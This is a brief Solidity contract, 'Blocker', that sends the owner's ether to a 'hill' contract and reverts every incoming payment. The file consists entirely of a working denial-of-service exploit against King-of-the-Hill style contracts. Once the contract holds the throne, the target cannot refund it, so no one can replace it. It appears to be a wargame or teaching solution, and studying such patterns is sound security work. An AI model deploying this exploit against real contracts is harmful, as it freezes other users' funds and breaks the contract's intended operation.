// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract Blocker {

  address public owner;
  address payable public hill;

  constructor(address payable _hill) {
    owner = msg.sender;
    hill = _hill;
  }

  function sendEther() payable public returns (bool) {
    require(msg.sender == owner);
    (bool ret, ) = hill.call{value: msg.value}("");
    return ret;
  }

  receive() external payable {
    revert();
  }

}